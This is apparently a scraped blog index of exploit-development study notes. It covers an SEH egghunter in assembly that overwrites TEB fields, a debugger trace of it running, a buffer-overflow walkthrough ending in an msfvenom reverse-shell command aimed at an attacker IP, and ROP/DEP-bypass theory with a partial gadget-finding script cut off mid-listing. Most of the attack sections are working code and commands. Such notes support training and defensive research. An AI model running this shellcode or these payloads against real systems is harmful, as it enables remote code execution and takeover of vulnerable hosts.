as we are doing a call operation, the return address is stored in the stack (the call instruction does that) so that the program knows where to continue after the build_exception_record function has finished. the build_exception_record function starts by popping the return value (which has just been stored in the stack, and represents the location of our egghunter) into the ecx register. then, the egg signature (0x74303077, t00w in little endian, remember that to store numbers and strings we have to store them in little endian) is moved to the eax register. then, we are going to add the two values of the _exception_registration_record structure in the stack, as we want to build our own _exception_registration_record. we push our return address pointing to the next instruction after our call instruction (this is the value of the push 0x0c instruction) as the \u0026ldquo;handler\u0026rdquo; member of the _exception_registration_record structure, and then we push the value of \u0026ldquo;-1\u0026rdquo; (0xffffffff) as our next member. this signals that this registration record is tha last one, as there is no next member!. the os won\u0026rsquo;t search for more handlers after this one. then, we overwrite the first exception handler (that is pointed by fs:[0]) by nulling ebx, and putting the value of fs[ebx] to the values on the top of the stack. wow! we just pushed both values of the _exception_registration_record in the top of the stack! this basically overwrites the first exception handler for our custom one. the next functions (is_egg, loop_inc_page, and loop_inc_one) are meant to search for our egg in memory. they are similar to the previous egghunter, but rather than executing the scasd operation twice, we use the repe instruction with the counter stored in ecx. this is done to minimize the size of the egghunter. given that we do not use any system call to check if a memory page is mapped or if we can access it, the access violation will be triggered on the repe scasd instruction. this will raise an exception that will trigger our custom handler. we want that our exception handler restores execution at the loop_inc_page function, which will move on to the next memory page and repeat the search.\nduring a previous module, we explored the prototype of the _except_handler function, the function of our handler:\ntypedef exception_disposition _except_handler (*pexception_routine) ( in pexception_record exceptionrecord, in void establisherframe, in out pcontext contextrecord, in out pdispatcher_context dispatchercontext ); when an exception is triggered, the os will call our custom \u0026ldquo;handler\u0026rdquo; function, passing these four parameters into the stack. therefore, these 4 parameters will be in the stack and we will be able to manipulate them. the interesting parameter is the third parameter, the pcontext parameter, which points to a context structure:\n0:009\u0026gt; dt ntdll!_context +0x000 contextflags : uint4b +0x004 dr0 : uint4b +0x008 dr1 : uint4b +0x00c dr2 : uint4b +0x010 dr3 : uint4b +0x014 dr6 : uint4b +0x018 dr7 : uint4b +0x01c floatsave : _floating_save_area +0x08c seggs : uint4b +0x090 segfs : uint4b +0x094 seges : uint4b +0x098 segds : uint4b +0x09c edi : uint4b +0x0a0 esi : uint4b +0x0a4 ebx : uint4b +0x0a8 edx : uint4b +0x0ac ecx : uint4b +0x0b0 eax : uint4b +0x0b4 ebp : uint4b +0x0b8 eip : uint4b // interesting +0x0bc segcs : uint4b +0x0c0 eflags : uint4b +0x0c4 esp : uint4b +0x0c8 segss : uint4b +0x0cc extendedregisters : [512] uchar this structure contains the processor register data at the time the exception occurred. at the moment the exception occurs, all register values are stored in this structure. at offset 0x0b8 from the beginning of this structure, we find the eip member. this member stores the memory address pointing to the instruction that caused the access violation. this member is an important part of the egghunter resuming execution. because we can modify this structure as part of our custom _except_handler implementation, we can also resume the execution flow at the _loop_inc_page function to move to the next memory page.\nour handler also needs to take care of the return value, in eax. the result of the handler comes in the form of an _exception_disposition structure containing four members, each of them acting as a return value:\n0:006\u0026gt; dt _exception_disposition ntdll!_exception_disposition exceptioncontinueexecution = 0n0 exceptioncontinuesearch = 0n1 exceptionnestedexception = 0n2 exceptioncollidedunwind = 0n3 therefore, to continue the execution, this value must be 0x00, to signal that the exception has been successfully handled, so that when the exception is triggered and our function is executed, we return to the _loop_inc_page value and continue the execution, in a loop.\nso at the memory address of the \u0026ldquo;handler\u0026rdquo; (our returning point to manage the exception) must:\nretrieve the contextrecord parameter which has been pushed to the stack, as well as the other 3 parameters. obtain the eip member adding 0xb8 to the offset of contextrecord. we modify the value of this eip member to the loop_inc_page memory address offset. we save this value in eax as we want to return to this address. reduce the stack size to clear the 4 arguments that are not needed anymore. we already got the eip value and added the offset, and stored this value in eax. push the eax (address we want to return, which is the address of push 0x0c) into the stack. null out eax to signal the os that the exception has been managed ( exceptioncontinueexecution) perform a ret instruction to return to the loop_inc_page function. the ret at the end of our shellcode would return to the address of the push 0x0c instruction but as eax is 0, the return address is not used and the eip from the context parameter in the stack is used to set up eip. as we modified eip to go to the add+1 page and continue searching, we repeat the search process again and again.\ntbd: i think that you can put any address in the top of the stack before using the ret instruction as the return address will never be used. eip from the context variable will be used.\nnext, this won\u0026rsquo;t work at all. the following checks over our seh handler will be performed:\nthe memory address of our _exception_registration_record structure needs to be higher than the stacklimit. the memory address of our _exception_registration_record structure plus 0x08 needs to be lower than the stackbase. the memory address of our _exception_registration_record structure needs to be aligned to the four bytes boundary. the memory address of our _except_handler function needs to be located at a higher address than the stackbase. the three first ones are ok, as we created a exception_registration_record structure in the stack, so it is between the stacklimit and stackbase and will meet those conditions always. but our custom function is also inside the stack, and condition 4 tries to check if it is located at a higher memory address than the stackbase. this check is implemented because the stack is only supposed to contain data. functions can read or write to it but the stack is not supposed to contain executable code. how do we manage to execute our function then? well, we have modified the field of the teb corresponding to the address of the first handler to be executed. why don\u0026rsquo;t we modify the value of the stackbase field of the teb to be lower than the address of our _except_handler function, but higher than the value of our _exception_registration_record structure?\nthe egghunter already gathered the address of the except_handler function dinamically, so we could substract a small number of bytes from it (not much, so the stackbase is still higher than our _exception_registration_record structure) and use that to overwrite the stackbase value. this is what is updated in the egghunter:\n# overwrite exceptionlist in the teb with a pointer # to our new _exception_registration_record structure \u0026#34; mov dword ptr fs:[ebx], esp ;\u0026#34; # subtract 0x04 from the pointer # to exception_handler \u0026#34; sub ecx, 0x04 ;\u0026#34; # add 0x04 to ebx \u0026#34; add ebx, 0x04 ;\u0026#34; # overwrite the stackbase in the teb to the address -4, which is in ecx # this way, stackbase will be lower than our except_handler function! \u0026#34; mov dword ptr fs:[ebx], ecx ;\u0026#34; now the verification is done. remember that this module does not have safeseh so we don\u0026rsquo;t need to bypass it, but it would be another protection to bypass.\nthe final seh egghunter would be this one:\nfrom keystone import * code = ( \u0026#34; start: \u0026#34; # jump to a negative call to dynamically # obtain egghunter position\u0026#34; jmp get_seh_address ;\u0026#34; \u0026#34; build_exception_record: \u0026#34; # pop the address of the exception_handler # into ecx\u0026#34; pop ecx ;\u0026#34; # mov signature into eax \u0026#34; mov eax, 0x74303077 ;\u0026#34; # push handler of the # _exception_registration_record structure\u0026#34; push ecx ;\u0026#34; # push next of the # _exception_registration_record structure\u0026#34; push 0xffffffff ;\u0026#34; # null out ebx \u0026#34; xor ebx, ebx ;\u0026#34; # overwrite exceptionlist in the teb with a pointer # to our new _exception_registration_record structure\u0026#34; mov dword ptr fs:[ebx], esp ;\u0026#34; # subtract 0x04 from the pointer (address) to exception_handler \u0026#34; sub ecx, 0x04 ;\u0026#34; # add 0x04 to ebx so it points to teb stackbase field instead of the first element of teb \u0026#34; add ebx, 0x04 ;\u0026#34; # overwrite the stackbase in the teb \u0026#34; mov dword ptr fs:[ebx], ecx ;\u0026#34; \u0026#34; is_egg: \u0026#34; # push 0x02 \u0026#34; push 0x02 ;\u0026#34; # pop the value into ecx which will act # as a counter\u0026#34; pop ecx ;\u0026#34; # mov memory address into edi \u0026#34; mov edi, ebx ;\u0026#34; # check for our signature, if the page is invalid we # trigger an exception and jump to our exception_handler function\u0026#34; repe scasd ;\u0026#34; # if we didn\u0026#39;t find signature, increase ebx # and repeat\u0026#34; jnz loop_inc_one ;\u0026#34; # we found our signature and will jump to it \u0026#34; jmp edi ;\u0026#34; \u0026#34; loop_inc_page: \u0026#34; # if page is invalid the exception_handler will # update eip to point here and we move to next page\u0026#34; or bx, 0xfff ;\u0026#34; \u0026#34; loop_inc_one: \u0026#34; # increase ebx by one byte \u0026#34; inc ebx ;\u0026#34; # check for signature again \u0026#34; jmp is_egg ;\u0026#34; \u0026#34; get_seh_address: \u0026#34; # call to a higher address to avoid null bytes \u0026amp; push # return to obtain egghunter position\u0026#34; call build_exception_record ;\u0026#34; # push 0x0c onto the stack \u0026#34; push 0x0c ;\u0026#34; # pop the value into ecx \u0026#34; pop ecx ;\u0026#34; # mov into eax the pointer to the context # structure for our exception\u0026#34; mov eax, [esp+ecx] ;\u0026#34; # mov 0xb8 into ecx which will act as an # offset to the eip\u0026#34; mov cl, 0xb8 ;\u0026#34; # increase the value of eip by 0x06 in our context # so it points to the \u0026#34;or bx, 0xfff\u0026#34; instruction # to increase the memory page\u0026#34; add dword ptr ds:[eax+ecx], 0x06 ;\u0026#34; # save return value into eax \u0026#34; pop eax ;\u0026#34; # increase esp to clean the stack for our call \u0026#34; add esp, 0x10 ;\u0026#34; # push return value back into the stack \u0026#34; push eax ;\u0026#34; # null out eax to simulate # exceptioncontinueexecution return\u0026#34; xor eax, eax ;\u0026#34; # return \u0026#34; ret ;\u0026#34; ) # initialize engine in 32bit mode ks = ks(ks_arch_x86, ks_mode_32) encoding, count = ks.asm(code) egghunter = \u0026#34;\u0026#34; for dec in encoding: egghunter += \u0026#34;\\\\x{0:02x}\u0026#34;.format(int(dec)).rstrip(\u0026#34;\\n\u0026#34;) print(\u0026#34;egghunter = (\\\u0026#34;\u0026#34; + egghunter + \u0026#34;\\\u0026#34;)\u0026#34;) after checking no null bytes, append the egghunter instead of the classical egghunter and send the exploit. you should get a reverse shell:\n0:009\u0026gt; !teb teb at 00399000 exceptionlist: 022dff60 stackbase: 022e0000 stacklimit: 022dc000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00399000 environmentpointer: 00000000 clientid: 000012e0 . 00001904 rpchandle: 00000000 tls storage: 00000000 peb address: 0038f000 lasterrorvalue: 0 laststatusvalue: 0 count owned locks: 0 harderrormode: 0 // no custom handlers. exception going to be handled with default handler. 0:009\u0026gt; dt _exception_registration_record 022dff60 ntdll!_exception_registration_record +0x000 next : 0x022dffcc _exception_registration_record +0x004 handler : 0x77ae8b10 _exception_disposition ntdll!_except_handler4+0 0:009\u0026gt; g (12e0.1d20): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. eax=74303077 ebx=00000004 ecx=00000002 edx=77ae2da0 esi=001b5868 edi=00000004 eip=04f1eab3 esp=04f1ea1c ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 04f1eab3 f3af repe scas dword ptr es:[edi] 0:004\u0026gt; !teb teb at 00394000 exceptionlist: 04f1ea1c stackbase: 04f1eac2 stacklimit: 04f1c000 subsystemtib: 00000000 fiberdata: 00001e00 arbitraryuserpointer: 00000000 self: 00394000 environmentpointer: 00000000 clientid: 000012e0 . 00001d20 rpchandle: 00000000 tls storage: 0064a0e0 peb address: 0038f000 lasterrorvalue: 0 laststatusvalue: c000000d count owned locks: 0 harderrormode: 0 0:004\u0026gt; dt _exception_registration_record 04f1ea1c ntdll!_exception_registration_record +0x000 next : 0xffffffff _exception_registration_record +0x004 handler : 0x04f1eac6 _exception_disposition +4f1eac6 0:004\u0026gt; bp 0x04f1eac6 0:004\u0026gt; g breakpoint 1 hit eax=00000000 ebx=00000000 ecx=04f1eac6 edx=77af6270 esi=00000000 edi=00000000 eip=04f1eac6 esp=04f1e4c0 ebp=04f1e4e0 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 04f1eac6 6a0c push 0ch 0:004\u0026gt; u eip l10 04f1eac6 6a0c push 0ch 04f1eac8 59 pop ecx 04f1eac9 8b040c mov eax,dword ptr [esp+ecx] 04f1eacc b1b8 mov cl,0b8h 04f1eace 83040806 add dword ptr [eax+ecx],6 04f1ead2 58 pop eax 04f1ead3 83c410 add esp,10h 04f1ead6 50 push eax 04f1ead7 31c0 xor eax,eax 04f1ead9 c3 ret 0:004\u0026gt; bp 0x04f1ead9 0:004\u0026gt; g breakpoint 2 hit eax=00000000 ebx=00000000 ecx=000000b8 edx=77af6270 esi=00000000 edi=00000000 eip=04f1ead9 esp=04f1e4d0 ebp=04f1e4e0 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 04f1ead9 c3 ret 0:004\u0026gt; u 04f1e4d0 04f1e4d0 52 push edx 04f1e4d1 62af771ceaf1 bound ebp,qword ptr [edi-0e15e389h] 04f1e4d7 0470 add al,70h 04f1e4d9 62af771ceaf1 bound ebp,qword ptr [edi-0e15e389h] 04f1e4df 04a8 add al,0a8h 04f1e4e1 e5f1 in eax,0f1h 04f1e4e3 0424 add al,24h 04f1e4e5 62af77c0e5f1 bound ebp,qword ptr [edi-0e1a3f89h] 0:004\u0026gt; t eax=00000000 ebx=00000000 ecx=000000b8 edx=77af6270 esi=00000000 edi=00000000 eip=77af6252 esp=04f1e4d4 ebp=04f1e4e0 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!executehandler2+0x26: 77af6252 648b2500000000 mov esp,dword ptr fs:[0] fs:003b:00000000=04f1e4d4 tbd decir que despues del ret no hemos ido a 04f1ead9 sino a ntdll!executehandler2+0x26 y que esto acaba volviendo a buscar en nuestra memoria o si encuentra el code nos da la shell 0:004\u0026gt; g (12e0.1d20): access violation - code c0000005 (first chance) first chance exceptions are reported before any exception handling. this exception may be expected and handled. eax=74303077 ebx=00001000 ecx=00000002 edx=77ae2da0 esi=001b5868 edi=00001000 eip=04f1eab3 esp=04f1ea1c ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010216 04f1eab3 f3af repe scas dword ptr es:[edi] ","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_overflow_1/","summary":"\u003ch1 id=\"locating-the-crash\"\u003eLocating the crash\u003c/h1\u003e\n\u003cp\u003eGenerate the pattern with KALI or online.\nPut the pattern as payload and detect the offset of the crash.\nOnce the offset is located, fill with As.\u003c/p\u003e\n\u003cp\u003emsf-pattern_create -l 2600\u003c/p\u003e\n\u003cp\u003eWhen crashing, EIP will have a certain value.\nCopy the value to obtain the exact offset:\nmsf-pattern_offset -l 2600 -q \u0026ldquo;TBD_EIP\u0026rdquo;\u003c/p\u003e","tags":[],"text":"locating the crash generate the pattern with kali or online. put the pattern as payload and detect the offset of the crash. once the offset is located, fill with as.\nmsf-pattern_create -l 2600\nwhen crashing, eip will have a certain value. copy the value to obtain the exact offset: msf-pattern_offset -l 2600 -q \u0026ldquo;tbd_eip\u0026rdquo;\nnote that the offset given by the tool does not cover eip. you will have to add 4 bytes after that offset to cover eip.\nonce we add the buffer + the offset to cover eip, it\u0026rsquo;s turn to know where our shellcode is stored. let\u0026rsquo;s put some cs, and see where esp points: dds esp dds esp-4 dds esp-8 dds esp-10 until we don\u0026rsquo;t see cs: we know esp-8, then 8. we check it now badchars.\nbadchars = ( b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; b\u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; b\u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; b\u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; b\u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; b\u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; b\u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; b\u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; b\u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) db esp lff to show all the bytes and see if any is affected: delete badchars if applicable. see if any of them is missing and repeat the step.\nnow we have to find a jmp esp address in any dll. remember:\nthat address must not contain badchars -\u0026gt; the jmp esp must not be in a read only section. if the dll has dep, .data is executable and we can use that address. we want the opcode of the jmp esp instruction. in kali, execute msf-nasm_shell and introduce jmp esp. the value is ffe4\nthen we see all modules with lmd and then we get our module with lm m \u0026ldquo;tbd_module_name\u0026rdquo; we should see the start and end address and confirm there are no badchars(remember, zeros are only bad at left)\nthen we search for the ffe4 (jmp esp) instruction in that range: s -b start end 0xff 0xe4\nif we get an ocurrence, we confirm that the address does not contain badchars: eip will have to point to that address. remember to put the address in little endian: eip = b\u0026quot;\\xcf\\x10\\x80\\x14\u0026quot; # 0x148010cf\ngenerate msfvenom payload with badchars:\nmsfvenom -p windows/shell_reverse_tcp lhost=192.168.119.120 lport=443 -f python –e x86/shikata_ga_nai -b \u0026#34;\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\u0026#34; note that you can put the exitfunc=thread parameter so that only exits the thread and not the whole program when the shellcode is executed.\n","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_rop_1/","summary":"\u003ch1 id=\"rop-lore\"\u003eROP Lore\u003c/h1\u003e\n\u003ch2 id=\"why-is-rop-needed\"\u003eWhy is ROP needed\u003c/h2\u003e\n\u003cp\u003eThe classic buffer overflows manage to execute arbitrary code by redirecting the execution flow to \u003cstrong\u003esomething in the stack (that is normally also user-controlled)\u003c/strong\u003e.\nHowever, the normal program flow does \u003cstrong\u003enot need to redirect the execution flow of the stack as the code that is being executed is normally\u003c/strong\u003e in the .text section of the binary. The stack is used to store and manage local variables and parameters to functions.\u003c/p\u003e","tags":[],"text":"rop lore why is rop needed the classic buffer overflows manage to execute arbitrary code by redirecting the execution flow to something in the stack (that is normally also user-controlled). however, the normal program flow does not need to redirect the execution flow of the stack as the code that is being executed is normally in the .text section of the binary. the stack is used to store and manage local variables and parameters to functions.\ndistinction between code/data regions so in order to avoid the classic buffer overflow, the operating system marks the pages of memory of the stack as non-executable, modifying the nx bit of the cpu. the kernel sets the nx bit when the os maps a memory page. if an application attempts to execute code from a data page that is protected (nx bit), a memory access violation exception occurs, and if the exception is not handled, the calling process is terminated. note: normally, dep and nx is disabled at os level but some bios allows disabling the bit directly in the bios config. this is so that the cpu does not enforce this security mechanism.\nret2libc in linux originally, to bypass dep a jump to the libc function was performed, passing the arguments. you set the arguments in the stack, and call the function you want to execute of the libc, which is executable code.\nover the years, the technique was expanded, and the commonly-used return oriented programming (rop) method was developed, allowing the user to execute any code routine and not only specific library functions.\nold dep bypass by using rop (windows) exploit developers first abused the fact that dep could be disabled on a per-process basis in windows. even if dep was enabled as a \u0026ldquo;alwayson\u0026rdquo; system policy, it could be disabled per process once the process is running. the idea was to invoke the ntsetinformationprocess api, which resides in a memory region that is already executable. with this, an attacker could disable dep before executing their shellcode. therefore, mark the stack as executable again and execute our shellcode in the stack. this works by replacing the commonly-used \u0026ldquo;jump to shellcode\u0026rdquo; for the memory address of ntsetinformationprocess. additionally, we also have to place the required arguments on the stack as part of the overwrite. once the ntsetinformationprocess api finishes, dep is disabled, and we can jump to our shellcode again. other attack variations have been widely used in public exploits. one such attack uses the winexec function to execute commands on the vulnerable system. while this is useful, it is not as effective as having arbitrary shellcode execution.\nnow, windows implements the permanent dep: any executable linked with the /nxcompat flag is automatically set as optin, meaning that it dep cannot be disabled. the only option then is to circumvent the operating system nx checks.\nrop technical considerations instead of setting in our stacks the \u0026ldquo;libc\u0026rdquo; or whatever function we want to execute in a memory page with execution, a more general approach was designed. we can design a technique to call any instruction sequence we want, if these conditions are met:\nthe instruction(s) we want to execute are followed by a ret at the end the instruction we want is in a memory page with execution rights. if that condition happens, the instruction is a rop gadget. we will replace rip with the memory address of any \u0026ldquo;gadget\u0026rdquo;, so we jump to that instruction, execute it, and then return to the next instruction to execute (which will be the next element in the stack). for that, we need to have the necessary gadgets in the application to perform our task. the number of obtainable gadgets depends on the os version and the vulnerable application.\ndifferent rop approaches at this point, depending on our goals and on the number of gadgets we can obtain, there are two different approaches we could take:\nbuild a 100% rop shellcode. build a rop stage that can lead to subsequent execution of traditional shellcode. the first approach is rather complicated to implement, so we’ll pursue the second instead. a goal of the rop stage could be to allocate a chunk of memory with write and execute permissions and then copy shellcode to it.\none way to implement this rop attack is to allocate memory using the win32 virtualalloc api. a different approach to bypass dep could be to change the permissions of the memory page where the shellcode already resides by calling the win32 virtualprotect api. the address of both functions is usually retrieved from the import address table (iat) of the target dll that contains them. then the required parameters need to be pushed in the stack, which can also be done using rop gadgets and are usually done dinamically using rop gadgets as you can\u0026rsquo;t hardcode the parameters (e.g., you might n)\nanother alternative is to use the writeprocessmemory to hot-patch any code section (normally the .text section) with shellcode and jump into it. sometimes a call to ntprotectvirtualmemory or similar might be done in order to turn the memory page to writable (as code sections are normally rx but not wrx or wx).\nhowever, in both approaches, we are jumping to a executable sections instead of modifying the \u0026ldquo;nx\u0026rdquo; flag of the memory pages of the stack.\ngadget selection so far, we have a good understanding of the theory behind dep and how to overcome it with rop. a key missing element is how to locate the gadgets that are needed to invoke the apis.\nin the classic buffer overflow, we use the windbg search command to obtain the address of an instruction like jmp esp. for rop though, we need to locate the addresses of all the possible gadgets we can obtain. this first step will allow us to choose the gadgets we need and combine them to bypass dep.\nhowever, it’s difficult to search for gadgets manually because of the large number of possible candidates. instead, we’ll need to automate the process. we will discuss two different methods.\nnote: typically, it is not beneficial to search for very long rop gadgets because they will eventually contain instructions that are not useful, such as calls and jumps. the osed course shows that more than 5 instructions could start to be a serious problem. we filter by 5 and then filter the resulting gadgets.\nnote that:\njmp and call gadgets alter the execution flow, which might break our chain. push, pop gadgets change the stack, we have to be careful with that. mov esp, or any esp operation, alter the stack pointer, we have to be careful with that. assembly language contains several privileged instructions, which a regular application cannot execute. we must design our algorithm to remove these also. bad instructions for gadgets: privileged + unknown opcode \u0026#34;???\u0026#34; + jumps/calls bad = [\u0026#34;clts\u0026#34;, \u0026#34;hlt\u0026#34;, \u0026#34;lmsw\u0026#34;, \u0026#34;ltr\u0026#34;, \u0026#34;lgdt\u0026#34;, \u0026#34;lidt\u0026#34; ,\u0026#34;lldt\u0026#34;, \u0026#34;mov cr\u0026#34;, \u0026#34;mov dr\u0026#34;, \u0026#34;mov tr\u0026#34;, \u0026#34;in \u0026#34;, \u0026#34;ins\u0026#34;, \u0026#34;invlpg\u0026#34;, \u0026#34;invd\u0026#34;, \u0026#34;out\u0026#34;, \u0026#34;outs\u0026#34;, \u0026#34;cli\u0026#34;, \u0026#34;sti\u0026#34; \u0026#34;popf\u0026#34;, \u0026#34;pushf\u0026#34;, \u0026#34;int\u0026#34;, \u0026#34;iret\u0026#34;, \u0026#34;iretd\u0026#34;, \u0026#34;swapgs\u0026#34;, \u0026#34;wbinvd\u0026#34;, \u0026#34;call\u0026#34;, \u0026#34;jmp\u0026#34;, \u0026#34;leave\u0026#34;, \u0026#34;ja\u0026#34;, \u0026#34;jb\u0026#34;, \u0026#34;jc\u0026#34;, \u0026#34;je\u0026#34;, \u0026#34;jr\u0026#34;, \u0026#34;jg\u0026#34;, \u0026#34;jl\u0026#34;, \u0026#34;jn\u0026#34;, \u0026#34;jo\u0026#34;, \u0026#34;jp\u0026#34;, \u0026#34;js\u0026#34;, \u0026#34;jz\u0026#34;, \u0026#34;lock\u0026#34;, \u0026#34;enter\u0026#34;, \u0026#34;wait\u0026#34;, \u0026#34;???\u0026#34;] note: in some advanced cases, we might want to make use of a gadget containing a conditional jump instruction or a call. if we craft the stack layout appropriately, we can make use of these gadgets without disrupting the execution flow, but typically, it is best to avoid them altogether unless strictly required by specific conditions.\nnote: in x64, each memory page is 0x1000 (4kb). each module will have several memory pages, so we want to analyze all of them in search of our gadgets. some of them will be executable, some of them will not be.\npykd for gadget selection python-based windbg extension, that can be used also as individual scripts.\nthe pykd script must locate gadgets inside code pages of an exe or dll with the execute permission set.\nthe first step is to accept the name of the module as a parameter and locate it in memory. then, for the selected module, we locate all memory pages that are executable. code that is executed on these pages will not result in dep throwing an access violation. for each of these memory pages, we are going to locate the memory address of all the ret assembly instructions and store them in a list. once we have this list of memory addresses, we pick the first one, subtract one byte from it, and disassemble the opcodes to check if they are valid assembly instructions. if they are, we have found a possible rop gadget. this process will continue, by subtracting another byte and rechecking.\nthis is the pykd that will perform our gadget search functionality:\nfrom pykd import * import sys, time header = \u0026#34;#\u0026#34;*80 + \u0026#34;\\r\\n\u0026#34; header += \u0026#34;# findrop.py - pykd module for gadget discovery\\r\\n\u0026#34; header += \u0026#34;#\u0026#34;*80 + \u0026#34;\\r\\n\\r\\n\u0026#34; ##mem_access = { ##0x1 : \u0026#34;page_noaccess\u0026#34; , ##0x2 : \u0026#34;page_readonly\u0026#34; , ##0x4 : \u0026#34;page_readwrite\u0026#34; , ##0x8 : \u0026#34;page_writecopy\u0026#34; , ##0x10 : \u0026#34;page_execute\u0026#34; , ##0x20 : \u0026#34;page_execute_read\u0026#34; , ##0x40 : \u0026#34;page_execute_readwrite\u0026#34; , ##0x80 : \u0026#34;page_execute_writecopy\u0026#34; , ##0x101 : \u0026#34;page_noaccess page_guard\u0026#34; , ##0x102 : \u0026#34;page_readonly page_guard \u0026#34; , ##0x104 : \u0026#34;page_readwrite page_guard\u0026#34; , ##0x108 : \u0026#34;page_writecopy page_guard\u0026#34; , ##0x110 : \u0026#34;page_execute page_guard\u0026#34; , ##0x120 : \u0026#34;page_execute_read page_guard\u0026#34; , ##0x140 : \u0026#34;page_execute_readwrite page_guard\u0026#34; , ##0x180 : \u0026#34;page_execute_writecopy page_guard\u0026#34; , ##0x301 : \u0026#34;page_noaccess page_guard page_nocache\u0026#34; , ##0x302 : \u0026#34;page_readonly page_guard page_nocache\u0026#34; , ##0x304 : \u0026#34;page_readwrite page_guard page_nocache\u0026#34; , ##0x308 : \u0026#34;page_writecopy page_guard page_nocache\u0026#34; , ##0x310 : \u0026#34;page_execute page_guard page_nocache\u0026#34; , ##0x320 : \u0026#34;page_execute_read page_guard page_nocache\u0026#34; , ##0x340 : \u0026#34;page_execute_readwrite page_guard page_nocache\u0026#34; , ##0x380 : \u0026#34;page_execute_writecopy page_guard page_nocache\u0026#34; , ##0x701 : \u0026#34;page_noaccess page_guard page_nocache page_writecombine\u0026#34; , ##0x702 : \u0026#34;page_readonly page_guard page_nocache page_writecombine\u0026#34; , ##0x704 : \u0026#34;page_readwrite page_guard page_nocache page_writecombine\u0026#34; , ##0x708 : \u0026#34;page_writecopy page_guard page_nocache page_writecombine\u0026#34; , ##0x710 : \u0026#34;page_execute page_guard page_nocache page_writecombine\u0026#34; , ##0x720 : \u0026#34;page_execute_read page_guard page_nocache page_writecombine\u0026#34; , ##0x740 : \u0026#34;page_execute_readwrite page_guard page_nocache page_writecombine\u0026#34; , ##0x780 : \u0026#34;page_execute_writecopy page_guard page_nocache page_writecombine\u0026#34; , ##} mem_access_exe = { 0x10 : \u0026#34;page_execute\u0026#34; , 0x20 : \u0026#34;page_execute_read\u0026#34; , 0x40 : \u0026#34;page_execute_readwrite\u0026#34; , 0x80 : \u0026#34;page_execute_writecopy\u0026#34; , } page_size = 0x1000 max_gadget_size = 8 bad = [\u0026#34;clts\u0026#34;, \u0026#34;hlt\u0026#34;, \u0026#34;lmsw\u0026#34;, \u0026#34;ltr\u0026#34;, \u0026#34;lgdt\u0026#34;, \u0026#34;lidt\u0026#34; ,\u0026#34;lldt\u0026#34;, \u0026#34;mov cr\u0026#34;, \u0026#34;mov dr\u0026#34;, \u0026#34;mov tr\u0026#34;, \u0026#34;in \u0026#34;, \u0026#34;ins\u0026#34;, \u0026#34;invlpg\u0026#34;, \u0026#34;invd\u0026#34;, \u0026#34;out\u0026#34;, \u0026#34;outs\u0026#34;, \u0026#34;cli\u0026#34;, \u0026#34;sti\u0026#34; \u0026#34;popf\u0026#34;, \u0026#34;pushf\u0026#34;, \u0026#34;int\u0026#34;, \u0026#34;iret\u0026#34;, \u0026#34;iretd\u0026#34;, \u0026#34;swapgs\u0026#34;, \u0026#34;wbinvd\u0026#34;, \u0026#34;call\u0026#34;, \u0026#34;jmp\u0026#34;, \u0026#34;leave\u0026#34;, 